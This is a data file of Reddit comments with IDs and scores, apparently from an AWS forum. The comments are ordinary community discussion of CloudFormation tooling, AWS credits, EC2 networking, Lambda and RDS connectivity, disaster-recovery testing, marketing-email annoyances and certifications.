Rule of thumb = use it to generate the CF but understand that the resulting template is more of a ""sample"" and that you should write your own based on it",2.0
g6773gr,ix61ho,As many other similar tools CloudFormer is not a silver bullet and will require additional results adjustment. It can be used for initial CloudFormation preparation but then you will have to analyze and rewrite them before using in the prod.,1.0
g6d81j7,ix61ho,"Recommend checking out [Former2](https://github.com/iann0036/former2), as [CloudFormer is no longer actively developed](https://github.com/aws-cloudformation/aws-cloudformation-coverage-roadmap/issues/439#issuecomment-611676438)",1.0
g64xfo3,ix6cky,full upfront reserved EC2 instance is a good general default for something to use them on. Or novelty domain registrations,2.0
g66gq01,ix6cky,credits don't apply to RIs like that,3.0
g64y9gb,ix6cky,Domain registrations are one of the few things (only?) that AWS Credits aren't valid for.,2.0
g65z2ma,ix6cky,"You can’t use them for the upfront RI payment either.  You could use them to cover the hourly fee for partial- or no-upfront, but credits usually expire within 6 months so you’re stuck with paying it when they expire.",2.0
g64yxnr,ix6cky,"ugg, guess I'll be paying full price for clownpenis.bike",4.0
g65ac02,ix6cky,"Fire up a gpu spot instance and mine yourself some B$.

Probably only going to be worth 200$ till the price goes up.",4.0
g65rgil,ix6cky,No you will be caught,-1.0
g65zcng,ix6cky,“Caught?”  You might get an email from ec2 abuse because they will assume you’ve been hacked.  But there’s nothing in the EULA that prevents crypto mining - it’s just not normally cost effective.,3.0
g66h0yw,ix6cky,run t-pot on a m5a.4xlarge,1.0
g66pt9x,ix6cky,Run a tor node.,1.0
g679jc5,ix6cky,"What kind of class gives $2,000 in AWS credits?",1.0
g64zyc3,ix6cky,set up a charity website for a well-deserving charity.,0.0
g64ub6y,ix5zhc,"If you're only using this for studies I would pick whichever is cheapest, which I believe is US East typically. If you were running production workloads it makes sense to keep it close to you for latency reasons, if it's just for studying I would choose US East just for the cost savings.",2.0
g64s5oc,ix5zfn,"Guess you can use lambda to crawl the http page and use the put metric api and build a dashboard /alarm on that metric. 

I'm curious to find out what's the reason why you need to monitor by keyword, it it a seo thing?",1.0
g64s61q,ix5zfn,Check out [CloudWatch Synthetics](https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/CloudWatch_Synthetics_Canaries.html).,1.0
g64nkzp,ix5gcc,"It just does not work this way. You're doing like this:
You have an old laptop with Windows 7. You buy a new one with Windows 10. And now you're putting your old hard drive from your Win7-laptop into the new one. Which OS will start on the new one?",2.0
g64s9eq,ix5gcc,"That's unfortunate. I would've thought that EC2 instances might work different since they are essentially just containers. It makes sense why it wouldn't, but I was hoping I could change some instance attributes to make AWS recognize a change in OS",1.0
g64v8jl,ix5gcc,"Nope. EC2 is basically virtual machines, not containers. You have the ""hard disks"" which are the EBS volumes. If it's the volume with the OS on it, it's the root volume. Maybe you're confusing it with things like Docker or Kubernetes, where you have ""containers"" / pods running on swappable nodes. Here, you can change the node OS without affecting the container.",2.0
g650ua7,ix5gcc,"As well as this, the RHEL licence key lives on the instance and not the EBS, which is why option 1 didn't allow you to connect to the repos.",1.0
g64qeid,ix5gcc,Is it public or private IPs that you want to stay the same? Are you using an Elastic IP or not?,1.0
g64s0jc,ix5gcc,"I want the private IP address to be the same. The IP address was auto assigned on instance creation, so not an elastic IP unfortunately",1.0
g64tnsq,ix5gcc,"So what you'll want to do:

- Terminate old instance, making note of private IP
- Create a new ENI with the desired IP
- Create a new instance with the new ENI as the primary network interface. (I don't think you can do this via the console, but I do it with Terraform, so API supports it)

I think there might be a way to terminate the old instance while keeping its ENI around, which saves you step 2, but I'm not sure.

Without an elastic IP, you'll get a new public IP, unfortunately that's unavoidable.",2.0
g67zn8t,ix4zs5,"Robocopy with parallelism? Otherwise might need to look for a migration vendor. Is this file server in AWS already or is this also a cloud migration? If it’s outside AWS, your pipe in will also be a factor.",1.0
g69ggu6,ix4zs5,The source server is on-prem unfortunately. I'm going to Robocopy it all over. I was just looking for a clean easy way to do it. The business has been dragging its feet on upgrading servers and it looks like it's bit them in the butt in this case. Or....more accurately.... my butt since I'm having to do the work.,1.0
g64rj4d,ix4rdg,"It looks like Aurora Data API is a standard AWS API, which means it exists outside of your VPC.  VPC Lambdas can't access outside the VPC unless there's a NAT instance.  So I'm guessing that's where the problem lies.  Possible solutions:

- Don't use the Data API in the VPC, just use a standard postgres connection
- Set up a Data API VPC Endpoint in your VPC
- Set up a NAT gateway in your VPC",2.0
g67o200,ix4rdg,"Thanks for your reply.

&gt;VPC Lambdas can't access outside the VPC unless there's a NAT instance.

But my lambda is in the default subnets. And these subnets are public by default, and have an Internet Gateway associated with them. So, how can the NAT gateway help here?  


&gt;Don't use the Data API in the VPC, just use a standard postgres connection

I believe the best practice to connect to AWS RDS with engine mode as serverless is via the Data API.

&gt;Set up a Data API VPC Endpoint in your VPC

This seems doable. Can you give me a bit more detail on how to do it?",1.0
g67z233,ix4rdg,"Even in a public subnet, Lambdas don’t get internet access because they don’t get a public IP. You need a NAT to provide that public IP. 

Data API is better for serverless, but traditional connections aren’t *that* bad. 


VPC endpoint should be pretty easy to set up. FYI it does have a monthly cost. 
https://docs.aws.amazon.com/vpc/latest/userguide/vpce-interface.html",2.0
g6ifw3g,ix4rdg,"Thanks. You were right about setting up a NAT gateway to allow lambda to access the internet. For anyone checking this out later, I will drop this [aws guide](https://aws.amazon.com/premiumsupport/knowledge-center/internet-access-lambda-function/) which walks through the process of how to set it up.",1.0
g647253,ix2r2s,"The best DR test is to unleash a [Chaos Monkey](https://github.com/netflix/chaosmonkey) upon your infrastructure.

Of course, this also requires the highest level of DR preparedness and the highest costs for the necessary redundancy to support it, but any DR plan should be looking to get as close to this test as is feasible given available resources.",3.0
g64zy9x,ix2r2s,"I like this. It looks like we’d have to use Spinnaker, but we’re at a point where we’re rethinking some of our deployment to include continuous delivery anyway.",1.0
g65bvw9,ix2r2s,"A ""possible"" option to evaluate is Chaos Lambda.  It is a lighter weight solution although not as fully featured and battle tested as Chaos Monkey.  Also serverless, so cheaper.  See [https://github.com/artilleryio/chaos-lambda](https://github.com/artilleryio/chaos-lambda)",2.0
g65q5xk,ix2r2s,"Great comments but I would be hesitant to deploy ChaosMonkey unless your workload resembles that of its original author Netflix.

ChaosMonkey terminates production instances. This is fine if you are streaming service with presumably thousands of lightweight instances providing on-demand TV, where new instances should be spun up but if the test fails the loss of a few instances might inconvenience a few subscribers at the most.

However if you have single-instance applications that manage mission-critical data EBS data like the back end of your cool new fintech or AI web service, shutting them off regularly is just plain risky. If the test goes horribly wrong you risk jeopardizing your entire business -- by testing precisely something that was meant to save your business.

Again, unless you are Netflix I recommend staying away from the production. Instead, copy snapshots your instances between regions for DR. Then after each copy job power on briefly the DR instance and ideally connect to it to confirm the application is running. By doing this you:

\- don't interfere with the production, ideally don't give the tool IAM permissions to the production

\- confirm that DR instances can boot (all the data is present and there is enough capacity at DR to start your instances). Brief poweron is inexpensive

\- you can do a dummy Route53 update on a test domain if you use that service

\- also powering on at the DR region is expected to work if the primary region (or availability zone or servers) go down since API endpoints are completely different, i.e. you need no cooperation from the compromised primary region. It is impossible to simulate what the situation is like if AWS lost an availability zone.

This is about as close as you can get to a real situation and is always testable with no risk to production. Why wouldn't you do this?

Here's a Medium post I wrote on this [https://medium.com/@thunder\_technologies/disaster-recovery-for-the-public-cloud-eba2be9566e](https://medium.com/@thunder_technologies/disaster-recovery-for-the-public-cloud-eba2be9566e) (caution some plugs at the end but all our Medium posts are meant to be as educational as possible). Good luck and kudos to you for thinking about DR in advance.",2.0
g662kou,ix2r2s,"cloudendure can continuously replicate machines on the cloud, even from aws itself",1.0
g66fw5a,ix2r2s,"First you have to define some things like the Recovery Time Objective (RTO) and the Recovery Point Objective (RPO). These discussions will drive the level of resiliency you need to implement. Because it is a wide range - you can build a system that can withstand an entire region failure, but it is quite costly to operate. Most can settle on planning for an Availability Zone loss being the target case but still having the ability to slowly restore their data from backups in any worse disaster. 

What you should plan to test are the things that are likely to happen. For example shut down every instance in a particular AZ and see what happens. Shut down anything that’s not multi-AZ. See how long it would take to replicate your production architecture if all you had was backups in S3. Pretend a core AWS service goes down and see how your applications handle it - this is where decoupling components gets really important to prevent cascading failures.",1.0
g64527w,ix2bsi,This sounds like the mail is being delayed after it was sent by the receiving messaging system.  You should be able to view the logs of the receiving system (or the headers on the message) to see the time stamp each MTA processed it.,1.0
g645uk2,ix2bsi,"Hey, do you mean this?  


Received: by 2002:a02:8801:0:0:0:0:0 with SMTP id r1csp3536638jai; Mon, 21 Sep 2020 **08:01:35 -0700 (PDT)**   


X-Received: by 2002:a0c:8f02:: with SMTP id z2mr280955qvd.21.1600700255279;         Mon, 21 Sep 2020 **07:57:35 -0700** (PDT)",1.0
g64cnn9,ix2bsi,"Yes - I’m taking a guess that your lambda sent it at 07:57 to the MTA 2002:a0c...the next report was at 8:01 by 2002:a02...

Those are IP6 addresses.  Not sure if you masked them a bit, but I couldn’t tell who those are owned by.  But that mail system where you should look.",1.0
g64b2i7,ix217g,I would say if the AWS API lets you do it without throwing an error then it's completely fine to do so.,5.0
g64b8ec,ix217g,"If I understand it correctly, the data for the snapshot is already held elsewhere once the process is initiated (you don't have to wait for it to finish). AWS snapshots are different from regular datacenter snapshots-- you can change/modify the volume after the snapshot is initiated without trouble.",2.0
g63xk68,ix20ug,Use the Firefox multi account container addon or the equivalent ones in Chrome.,1.0
g63y6t7,ix20ug,"I'm on chrome but will look for a chrome equivalent, and then give this a try if I can't find one.",1.0
g67h7ua,ix20ug,Check out Sessionbox.io Chrome extension. It wants you to sign up but you can do everything you need in guest mode.,1.0
g67jgsz,ix20ug,I tried it yesterday but it looks like my company has the browser locked down in such a way that it is blocked from working. Going to try using Firefox for cloud9 and chrome for everything else,1.0
g69jmc2,ix20ug,"If you can install a browser check out Brave. It can use all the same extensions as Chrome and your company may not lock down Brave. Obviously, do that at your own risk of violating company policy.",1.0
g64acyc,ix0dmq,"A serverless event sourcing infrastructure and SDK.

I use AWS CDK for the deployments of both the event store application and the user land microservices. The SDK is in Typescript, and allows fully typehinted code, oncluding your application events.

Almost done with the infra and the SDK, but will need to create some more serverless tooling for tracing, logging, and something else for local execution using docker.

The deployments of microservices run in parallel and execute on the background until they reach the latest events in your app, so there's never downtime, and no migrations are required either.",7.0
g65k8vh,ix0dmq,"A serverless platform for on-demand application streaming with AWS EC2, Nice-DCV, GitLab CI, Terraform and AWS Lambda!

Setting up RDS with AWS Lambda and hoping to finish the communication between both components by after tomorrow.",2.0
g64pf57,ix0dmq,I’ve created a lambda function that post to my line app price changes in a list of stocks,1.0
g655txg,ix0dmq,"Setting up wordpress in beanstalk with rds and cloudfront. 

Creating a scheduled lambda that will upload s3 files to an ftp server of a client. I had made a s3 sync script before but they didnt want to install the awd cli ):",1.0
g65s7sr,ix0dmq,A lambda function to hit hundreds of Oracle databases and execute any query I want. These customers are all in separate VPCs and RDS instances. The point is to save DBA time when we need to know/update something on all instances.,1.0
g663jpk,ix0dmq,"We're building an event-oriented hosting management platform on top of the serverless framework, entirely driven by infrastructure as code and ci/cd. Quite a journey so far, and we are only now building the messaging infrastructure and SDK to allow our existing serverless services to publish events in a common and standardize way, particularly through the usage of json schema based APIs.",1.0
g6646mx,ix0dmq,"Application environments running completely on EKS and Fargate.

Which brought me to two wanted facilities I was unaware were still unavailable to EKS/Fargate - Container Insights and Network Load Balancers.",1.0
g66d2e3,ix0dmq,Buiding everything because I’m preparing for SAP-C01 exam,1.0
g67yqws,ix0dmq,"I'm building server after server, O/S after O/S, tutorial after tutorial, in a desperate attempt to get an install of Moodle 3.9.2. to work without using Bitnami or another 'middleman' package. 

I think I'm getting really good at creating Instances and terminating them! Hey ho! It's off to work I go.",1.0
g68c7vh,ix0dmq,"Experimenting with a custom nodejs 14.x runtime for lambda and modernizing the bootstrap/runtime.js with async/await to simplify the structure. Also might install a deno runtime.

Looking for any guidance on how to set up a local testing environment—have a docker container based on the SAM CLI aws-sam-cli-emulation-image-nodejs12.x:rapid-1.0.0 image, but refactoring looks to be a chore.",1.0
g67b7jy,ix0dmq,"A serverless SCIM system to synchonize groups and users from one source (Active Directory on prem) to several SaaS applications such as AWS IAM, GitHub and Mongo Atlas. 

Built with

- Frontend: S3, CloudFront and Vue 

- API: API Gateway, Lambda, DynamoDB

- Backend: DDB Streams, Step Functions, SNS, Lambda 

AND 

A CloudTrail-like Audit log for our GitHub Event logs using organizational webhooks subsribed to all Events, API GW, DynamoDB and SNS for distributing events to other components.",1.0
g67rho7,ix0dmq,"About the cloud trail, do you store the events in dynamodb and allow retrieving all of them in pages, ordered by creation date?",1.0
g6blvwa,ix0dmq,"Currently the flow is:

API Gateway -&gt; Lambda (converts to CloudTrail Log Format and performs enrichment) -&gt; SNS 

And there are currently two Lambdas subscribed to the SNS topic: 

- Lambda (forwarder) -&gt; Firehose -&gt; S3 
- Lambda (Auditor) Checks for non-compliant Events such as public repos or individual collaborators based on the Event

I am looking into pushing data to Elasticsearch as we use it already to analyze CloudTrail logs. This will allow for Advanced Analytics, search and visualization",1.0
g63pqur,iwzrqz,Complain to your AWS reps every time. If they don’t get pushback from large customers they won’t improve.,30.0
g641bc2,iwzrqz,Yup. Had to escalate to our AWS account rep when a support ticket didn’t work MULTIPLE times. They kept coming. I don’t understand how a company that we trust with our enterprise applications can’t figure out how to turn off SPAM that they themselves generate.,8.0
g65zjvo,iwzrqz,...setup an auto-forward to your AWS rep.  :-p,3.0
g63vjun,iwzrqz,"The vast majority of AWS accounts are medium or small business accounts and most of those have no ""AWS rep"" and therefore, we have no one to complain to. 

Just saying, as in most cases, AWS doesn't want to hear from you, especially, if you are not a big corp spending millions. 

And all those console feedbacks are also being totally ignored, otherwise, they would already stop making the experience worse with every ""update"".",4.0
g644hhg,iwzrqz,"I love it when the typical answer is is ""Talk to your TAM""

Oh ok sure, lemme just go get my boss to pay for Enterprise support that's almost as much as our entire AWS spend.",7.0
g64c54s,iwzrqz,This is true in general but the number of places using Organizations with many accounts but without a support contact at all (which is not exactly a high barrier) is smaller than the percentage of the general AWS community.,3.0
g6801v4,iwzrqz,"\&gt;   AWS doesn't want to hear from you 

Definitely not true. You'd be surprised at the number of different ways that we listen to and connect with our customers. 

\&gt;  And all those console feedbacks are also being totally ignored 

Same -- the teams behind the changes to the console are definitely paying attention to the feedback that's been posted here and in other places.",2.0
g64ap8m,iwzrqz,Here you are: [aws-unsubscribe-email.sh](https://gist.github.com/Mattias-/5425d18c362a4a576fa387722e77a99e),26.0
g658qow,iwzrqz,lol that's amazing.,2.0
g63ivq2,iwzrqz,"It's less annoying if you just filter the email from [""aws-martketing-email-replies@amazon.com](mailto:""aws-martketing-email-replies@amazon.com)"" and create a folder for all of them. I don't really mind it anymore since I did that.",39.0
g64un2y,iwzrqz,"That seems like a bandaid rather than a solution. The solution here seems reasonable: when an AWS organization/ControlTower is doing account creation, it should probably be treated differently than when I make a one-off account",12.0
g64vjzm,iwzrqz,"Idk, we create dozens of accounts per year for different depts an such. Many of them gain from receiving the marketing emails. Seems like adding the complication of even a checkbox is way more trouble than just having it on by default and either filtering or unsubscribing individual emails.",6.0
g666hyc,iwzrqz,"Even more frustrating when your company send you a daily digest of filtered mail and you have to figure out which one is for your actual email, in case something important is filtered. Can I whitelist the marketing? Yes. But I won’t for the principle.",1.0
g63jswu,iwzrqz,"Sure, in theory that's fine - but I can't do that for gsuite groups, and I've now had to do this four times in ~12 months (different jobs).",-2.0
g63mnc0,iwzrqz,you had four jobs in twelve months?,8.0
g63qy6b,iwzrqz,Maybe a contractor or consultant?,10.0
g63s9u4,iwzrqz,Yeah when I was a contractor I also had 3-4 jobs every year.,7.0
g63s7i0,iwzrqz,"fine with me, just got my attention",1.0
g63wzym,iwzrqz,/u/jeffbarr,14.0
g67ztki,iwzrqz,I'm on it!,2.0
g647aha,iwzrqz,"This drives me nuts too. We pay Amazon a lot of money, have Enterprise support, have used them for years, etc yet we still get emails on new account creation like ""here's how you can spin up your first EC2 instance!"". We're way past that.

Please, AWS, do not send marketing emails to new accounts created in existing Orgs. I promise those emails will not further your engagement numbers. Thanks.",12.0
g63odpv,iwzrqz,Have you heard about what’s new on AWS APN TV?,8.0
g63qwjr,iwzrqz,We have an account manager and unfortunately they know my phone number.,6.0
g63tj22,iwzrqz,"I wish that more people realized, as you have, that your rep is there to sell you things. Unless you’re a big account, they don’t give a crap.",4.0
g65usz5,iwzrqz,I wish they just stopped requiring an email address to create accounts within an organization,4.0
g63r4km,iwzrqz,This. I'm on the edge of filtering them out as spam.,8.0
g63t501,iwzrqz,It's tough too because I want to do that but I'm worried about real notifications that I need to see getting filtered out. I complain to our reps every time I talk to them.,7.0
g66yh24,iwzrqz,"Right, some email might be useful. So we cannot do anything about it but to delete all the unnecessary emails they sent",1.0
g63tsc5,iwzrqz,"That's what I did. We already are a customer. No need to sell us even more ""services"".",1.0
g63j6wx,iwzrqz,"I've considered adding automation to opt out via CT customisations.

In reality I just set up mail rules to delete them when a new address shows up.",3.0
g63zcln,iwzrqz,I love how I just got an email from AWS as I was reading this thread.,3.0
g64rlmk,iwzrqz,Just for laughs- you can always go back to on-premise 🙂,3.0
g65c3v0,iwzrqz,aka edge computing,5.0
g65f4w8,iwzrqz,"Oh god please! Marketing emails are required by law to be opt-in, not opt-out.",2.0
g6673qh,iwzrqz,lul,1.0
g66lh4w,iwzrqz,I run my own email server and wrote some rules specifically for AWS marketing spam. Dell is also horrible about this.,1.0
g66ybdy,iwzrqz,"Funny, I was just wondering why I get all the aws emails, one after the other. LOL",1.0
g67qmln,iwzrqz,"I work for a small company. We dont have am AWS rep and we literally dont exist in their eyes. We signed up for the support contract once, as the console said it was a free trial for us. Got charged the full amount. Complaints totally ignored. Ended up canceling the support contract.",1.0
g64uj5v,iwzrqz,"Re-read your post and see that you are aware. that you can unsubscribe from the emails.  

Leaving this here for others that need it.

I realise that you need to do it across many accounts, but you can read here about how to do it:

https://aws.amazon.com/premiumsupport/knowledge-center/choose-email-preferences-aws/

Edit: re-read your email and see you’re aware of unsubscribing.",-4.0
g63h8jz,iwz5g1,You can receive emails from any domain. Just make sure you configure your MX records for the domain/got your rule sets configured.,3.0
g63isjy,iwylqu,I've seen [https://github.com/segmentio/chamber](https://github.com/segmentio/chamber) quite a bit as well.,2.0
g63jnj4,iwylqu,"Yeah me too! - I probably should have mentioned that in the post. I actually talk about it in the 'Why?' section of my README. Chamber messes with the casing of my environment variable, granted it does try to handle it just not in a way I was happy with. i.e. If I added \`ENV\_VAR\` it would put \`env-var\` into SSM Parameter Store",2.0
g64lwl5,iwxmor,Are the health checks passing?  I would guess that if no healthy IPs are available it'll just pick a random one.,2.0
g64m2a7,iwxmor,"Yeah, they are!",1.0
g634hol,iwxs1q,"Seems pretty straight forward.  Stand up a VPC, pick a subnet range that works for their networking already deployed on prem, stand up VPN to corporate office and other sites if needed.  Deploy Windows EC2 as needed.  Join the server to their AD.

Don't forget about routes on the VPC and Security Groups on the EC2 instance.",2.0
g635dt3,iwxs1q,"They don't even have a VPN :)  They are working local only, and they want to improve their systems, reduce costs, and go mobile.

I am also hearing appstream, what is that? I tried a test app (Firefox) and it opened in browser. Is it possible to integrate their db and app into this one and do all other mentioned stuff?",1.0
g63dimb,iwxs1q,"So it's a real PN, not a VPN?",1.0
g63dw8y,iwxs1q,"Yeah, everything is in local server at the moment, and all users are connected via LAN to that server. It is like old AS400 terminals, you execute a shortcut in your computer and it connects to main server. Only difference is it is a Windows app",1.0
g63ex0h,iwxs1q,Create site to site VPN for offices or let use dial in VPN when are out of office/mobile. Check office router model to see what VPN does it support.,1.0
g633jb6,iwsh3s,"You can’t directly 

However you can put Cloudfront in front of Lightsail.",1.0
g6670rr,iwsh3s,"I installed Lightsail, S3 is used as well and it is connected to CloudFront. CloudFront has received SSL on setting but website does not show SSL. I'm having problems here. Any solution fixed it?",1.0
g64o9bk,iwsh3s,ACM certs can only be used for a few specific services...they ***cannot*** be used to apply to a web server running on an EC2.  Use an ALB.,1.0
g62z3jf,iwwtvn,Sounds like a good use case for [https://aws.amazon.com/rds/proxy/](https://aws.amazon.com/rds/proxy/),3.0
g62zn6t,iwwtvn,"Yeah, I've been looking at that! Thanks for the suggestion.

I'm still trying to figure out why the RDS connections remain open after the Lambda finishes executing.",1.0
g634xxh,iwwtvn,What about Lambda -&gt; SQS -&gt; RDS?,1.0
g636eeo,iwwtvn,"That's actually my current architecture! I think we managed to solve the problem by using a SQLAlchemy NullPool. It's possible that the code was opening a new connection every time the lambda ran, we were assuming that the lambda was recreated at every http request but apparently lambda are reused in some ways. So each lambda was accumulating connections",1.0
g63r89v,iwwtvn,"[This article on managing RDS connections might help](https://www.jeremydaly.com/manage-rds-connections-aws-lambda/) 

It also has a link to reusing connections which explains how some of the underlying mechanisms work. It uses nodejs examples but would still be relevent to python.",1.0
g64lmou,iwwtvn,"Can you share your code for opening and closing SQLAlchemy sessions?

Make sure you're creating your engine outside of the connection handler, that way you can share a connection across invocations.",1.0
g65wzer,iwwtvn,"Problem was solved with a NullPool :) thanks.
I was creating the Engine outside of the session handler indeed.",1.0
g62lmmd,iwu57p,"I think you are looking for the [AWS Single Sign-On](https://aws.amazon.com/single-sign-on/) (SSO).

You will need to configure it in the master account. The SSO replaces the need of IAM Users, so will be in it that you will configure the users permissions. It will also give to the users a temporary credential for programmatic access (something that I like, because I no longer get concerned about users that does not update it).

You will also need to specify a identity provider, like an Active Directory. Or just use the AWS SSO as identity provider.

An alternative for a single user would be using Firefox containers with one for each account… But the SSO is better ;)",6.0
g62syww,iwu57p,"If you want to manage all your resources in one group, they should probably all be in one account (or a few accounts) rather than 30. The general idea of using multiple accounts is to split everything up into different contexts so you *have* to switch between them, and are less likely to clobber something important because your critical and non-critical resources are mixed together.

I don't know of any in-built tooling that does cross-account dashboards for resource management like that, so you'll probably need to do something custom. Or get used to using AWS SSO and browser containers (e.g. ""Multi-Account Containers"" in Firefox) to have multiple account sessions open at once for convenience.",2.0
g62mu9k,iwu57p,"If you created the accounts using AWS Organization, in each account you will find a role ""OrganizationAccountAccessRole"" with administrator permissions. 

You can assume the role from the organization account and then run ec2:DescribeInstances. 

&amp;#x200B;

You can read more about this [here](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_accounts_access.html).",1.0
g62nawt,iwu57p,"I also wrote this [piece of code](https://gist.github.com/Burekasim/bc033bf4ee78b722f9e61792f2f17ae1), that allows you to list and connect to all your ec2 instances from all the regions (per account). 

To run the script: 

python3 [ec2-instances.py](https://ec2-instances.py) aws-cli-profile-name ssh-user path-to-private-key 

I created shortcuts in zsh so I type the letter c, it connects to the personal account, d to the work account, and so on. This is how it looks:

    c () { ~/ec2.py private ec2-user ~/.ssh/super-secret.pem; }
    d () { ~/ec2.py work ec2-user ~/.ssh/work.pem; }",1.0
g62pum7,iwu57p,"Cloudwatch Cross Account Dashboards will save you a ton of development time. https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Cross-Account-Cross-Region.html

This allows you to create dashboards in a central account pulling data from your entire estate.",1.0
g62uoxv,iwu57p,"The options I can think of:

1) Script on top of AWS CLI.

2) Script using a cloud interface library in the language you prefer. If are familiar with python I'd recommend apache libcloud (https://libcloud.apache.org/).

3) If you'd like a web interface, something like Mist (https://github.com/mistio/mist-ce).",1.0
g63ipp3,iwu57p,"AWS Config aggregated views could probably show you which ec2 instances are running across accounts, but wouldn't give you a way to turn them on or off.",1.0
g64fhod,iwu57p,"Managing across accounts and regions can be challenging. We have built a simple solution that customers are using to accomplish just this (view all the EC2 instances running at any given time and turn them on or off on demand without having to manually switch to the organization account). By leveraging SSO, and the native agent from AWS, it is easy to discover, manage and operate on EC2 &amp; on-prem, Windows and Linux servers with our solution. The platform is fully hosted and SaaS based. And you can achieve all this using the free tier. Happy to share more about our solution if you'd like via a PM. You can read more about it here: [https://www.montycloud.com/day2-discovery-and-classification/](https://www.montycloud.com/day2-discovery-and-classification/) or watch a quick video here: [https://www.youtube.com/watch?v=mADZ0Q2Gcx4&amp;t=46s](https://www.youtube.com/watch?v=mADZ0Q2Gcx4&amp;t=46s)",1.0
g6355ds,iwtjxm,"Learn python, play with boto3 and automate things using AWS API etc.

Learn Terraform, its huge right now, and will be a nice tool to have on your resume, 

Practice drawing architecture diagrams, just quick sketchs, and see how you can change em. Find ways to use different services for different pieces of the architecture, KEEP IT SIMPLE THO.

Then go apply all over for cloud engineer/cloud admin etc type roles.",3.0
g63e82o,iwtjxm,Good advice. Also check out https://github.com/aws-samples for examples. Putting some learning projects on your GitHub could help you with applications.,2.0
g62ix2b,iwst9o,Also curious to get the same perspective on the ML cert.,1.0
g62q0v3,iwst9o,"They both cost $300, so that's the practical value ;)

In reality: They are just certs, you need actual knowledge and possibly experience for a position.",2.0
g63b8w1,iwst9o,"Agreed.

As a senior manager I can tell you the cert is only 10% of what I look for when hiring.

I have the AWS Security Specialist certificate but I got it to show my experience not the other way around.

Note: Each manager looks for different things when hiring so YMMV.",1.0
g63cqbh,iwst9o,"As an interviewer, if I see a cert that is relative to the job opening but not a large amount of experience, I will use that cert as area to probe deeper.  I will ask how something along the lines of how preparing for that cert changed/improved how you approach your current situation or processes.  If you do proceed with it, build a story around it.  Be able to weave it into you job interview narrative.  For me as a manager, it is not the cert that holds weight, it is how you can articulate what that learning did for you.  I work for a security vendor and do have the AWS Security cert.  The preparation process helped me understand how AWS view security and how to augment it is companion solutions.",1.0
g653s4s,iwst9o,"You're not going to get an AWS job because of a cert. They can help get you in the door for interviews, but employers will always want them to be backed up by real world experience. That's why most IT people who work in senior positions have generally had to work their way up from bottom rung of the ladder. 

I try to get certifications that align with my experience or my current role. Something completely outside of what I do like the ML cert wouldn't be useful because, while I may pick up a few useful tidbits here and there, I will forget most of what I learn because I won't ever use that knowledge in my day-to-day work.",1.0
g65oa3b,iwst9o,"But even as a thorough technical interviewer, I WILL give weight-age to certification as its a prrof that you went through the entire curriculum.",1.0
g66bjwf,iwst9o,"u/MattW224 u/Nivud u/InterestedBalboa u/Amnion_ 

How do you suggest I get into Cloud Security then? What steps should I take? What are some examples of projects that I could work on? The company I work doesn't work with the cloud so much but my boss wants me be the ""Cloud Security Guy"". I work for a startup so getting projects isn't that easy or straight forward.",1.0
g62k8r8,iwsg84,"This sounds like something that should be done before you create the cdk app.  Pass it in via context parameters. 

Cdk builds stacks.  If you really need it at stack deploy time then a custom resource might be what you want.",2.0
g62lvmd,iwsg84,Yes im usingn a custom resource. I got it to work,1.0
g62ekqf,iwsg84,"Don’t do it in the constructor ... or see if there’s still a ‘sync’ version of those calls, but really ... don’t do it in the constructor.",1.0
g62ez5q,iwsg84,"I would like not to, but this is necessary as I import a value from another stack which is requires to be imported at class instantiation, Ive never used aws sdk in node but it appears a sync version is not available",1.0
g62fjnc,iwsg84,"Yeap, looks like they got rid of them. Hate to be that guy, but you’re probably doing it wrong if you need to do this in a constructor.",1.0
g62gbmg,iwsg84,I agree. First time using cdk so may be using it wrong,1.0
g62ikhz,iwsg84,Nvm apparently you can use .send on the request object. Hard to find the documentstion for that :/,1.0
g62lasg,iwsg84,"I recently created custom code to compile lambdas using esbuild, and had to do it async. In order to make it work with the rest of my cdk code, i just stopped using classes and atarted using async factory methods.",1.0
g62bi2u,iwrgmu,"This isn't really a Lightsail issue. Once your domain is setup to point to your Lightsail instance then it's up to you to configure the software/application running on the Lightsail instance to process and respond to incoming requests appropriately—such as by configuring it to point requests for `/blog` to your blog page.

The way you go about doing this depends on what software/application you selected to run on your Lightsail instance. So, for example, the steps may differ considerably depending on whether you selected WordPress, cPanel, Plesk, LAMP, Nginx, Node.js etc. So you will have to refer to the documentation for the software/application you're running.",1.0
g62cvzw,iwrgmu,"Gotcha. So I'm running a Wordpress blog.And yes, I figured that I would need to make an entry in my \`hosted zone\` record for Route 53, but what exactly that entry will be to refer to [example.com/blog](https://example.com/blog) is a mystery to me.

The entries make it easier to point to a sub-domain.. but don't give any options to point to a subdirectory...  


[https://lightsail.aws.amazon.com/ls/docs/en\_us/articles/amazon-lightsail-using-route-53-to-point-a-domain-to-an-instance](https://lightsail.aws.amazon.com/ls/docs/en_us/articles/amazon-lightsail-using-route-53-to-point-a-domain-to-an-instance)  


There are directions like this, discussing the subdomain case, all over the net.. but no directions for the ""subdirectory"" use case...",1.0
g62elez,iwrgmu,"Route 53 is just for DNS stuff. DNS only deals with domains (and subdomains).

Everything that comes after the domain in the URL (e.g. `/blog`) has nothing to do with DNS or Route 53. Only the stuff before the `/` is relevant for DNS.

So Route 53 simply points the domain (or subdomain) to your server instance. 

Then it is the responsibility of the software/application (e.g. Wordpress) running on the server to process the incoming request and decide how to respond based on information such as the URL path (e.g. `/blog`), query parameters (e.g. `/blog?search=test`), the HTTP request headers, etc.

So the simple answer is that you don't point subdirectories to server instances, you only point domains (or subdomains) to server instances and then the software/application (e.g. Wordpress) on the server decides how to process stuff like the URL path and respond with the appropriate information.

Also be aware that the URL path (e.g. `/blog`) is not the same as a subdirectory. That's because the specified path may not have any relation to where the actual webpages are stored or what their filenames are. The URL path is simply used to indicate to the server which page/resource the user is requesting and then the server decides how to respond appropriately to that request based on how it interprets that URL path.

So, in summary, you just need to worry about the WordPress configuration. DNS and Route 53 are not relevant to your situation.",3.0
g62ihek,iwrgmu,"Cloudfront + config for origins and behavior based on path should be able to do it. Similar to how you can make the /media part of a domain go to a s3 bucket and the rest to ec2/ecs, for example",1.0
g625lzn,iwrcbj,Stage variables in api Gateway could be a neat way of parameterizing the version in the lambda arn,1.0
g62z4jf,iwrcbj,SAM has native support for versioning Lambdas. When integrating API GW through swagger/openapi you can provide the Lambda ARN to call with Version or without.,1.0
g622s16,iwqhpi,"once a given consumer receives a messages from the queue, that message is 'hidden' until the consumer deletes it or until the visibility timeout elapses (then the message is returned to the queue)

we run many services that have multiple consumers (and multiple producers) on a single queue",2.0
